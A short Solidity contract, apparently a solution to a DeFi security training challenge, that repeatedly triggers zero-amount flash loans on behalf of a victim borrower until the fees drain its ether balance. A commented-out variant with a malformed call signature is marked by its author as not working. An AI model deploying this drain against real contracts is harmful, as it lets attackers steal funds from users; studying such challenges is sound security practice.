// SPDX-License-Identifier: GPL-2.0+
pragma solidity ^0.8.3;
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
interface LendPool {
    function flashLoan(address borrower, uint256 borrowAmount) external ;
}
contract BatchFlashLoan is ReentrancyGuard{
    using Address for address;
    function start(address borrower, address pool) public nonReentrant {
        while(address(borrower).balance > 0) {
  /*   why cannot work
         pool.functionCall(
                abi.encodeWithSignature("flashLoan(address borrower, uint256 borrowAmount)", address(borrower), 0)
            );*/
            LendPool(pool).flashLoan(
                    address(borrower), 0
            );
        }
    }
}
